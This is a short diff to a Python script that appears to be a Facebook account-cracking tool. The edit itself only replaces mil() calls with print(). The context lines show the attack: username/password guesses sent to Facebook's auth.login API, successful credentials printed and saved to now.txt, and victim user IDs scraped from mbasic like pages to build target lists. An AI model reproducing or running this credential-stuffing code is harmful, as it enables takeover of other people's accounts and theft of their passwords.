@@ -211,7 +211,7 @@ def mbfv2():
              api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
              if 'EAA' in response.text:
-                 mil(f"\r\033[1;97m  * => {username}|{password}                       ",end="")
+                 print(f"\r\033[1;97m  * => {username}|{password}                       ",end="")
                  mil()
                  result += 1
                  if cek:
@@ -220,7 +220,7 @@ def mbfv2():
                         with open('now.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
              elif 'www.facebook.com' in response.json()['error_msg']:
-                   mil(f"\r\033[1;90m  * => {username}|{password}                    ",end="")
+                   print(f"\r\033[1;90m  * => {username}|{password}                    ",end="")
                    mil()
                    check += 1
                    if cek:
@@ -264,7 +264,7 @@ def mbfv2():
                          id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                          id.append(user[1] + "|" + user[0].split('/')[1])
-                 mil(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ',end="")
+                 print(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ',end="")
              if 'Lihat Selengkapnya' in str(like):
                  getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
              return id
